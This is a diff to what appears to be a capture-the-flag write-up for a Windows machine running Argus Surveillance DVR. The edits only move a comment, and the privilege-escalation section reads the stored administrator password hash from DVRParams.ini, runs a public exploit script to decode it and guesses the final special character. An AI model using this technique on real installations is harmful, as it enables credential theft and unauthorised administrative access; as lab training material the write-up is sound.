@@ -93,7 +93,7 @@ C:\Users\viewer>whoami
 dvr4\viewer
 ```
 ## Privilege Escalation
-we can read the administrator password file in C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini
+we can read the administrator password file in C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini 
 https://www.exploit-db.com/exploits/50130  
 ```console
 C:\ProgramData\PY_Software\Argus Surveillance DVR>type DVRParams.ini
@@ -102,7 +102,6 @@ Password0=ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8
 ```
 change the hash and run the script  
 missing the last letter and the scrip says  
-# I'm too lazy to add special characters :P  
 ```console
 $ python3 50130.py
 
@@ -128,6 +127,7 @@ $ python3 50130.py
 [+] 3CD9:g
 [-] D9A8:Unknown
 ```
+the script mention # I'm too lazy to add special characters :P  
 that means the last letter is a special characters  
 so i create a new user in port 8080 and try all the special characters  
 and found the D9A8 = $  
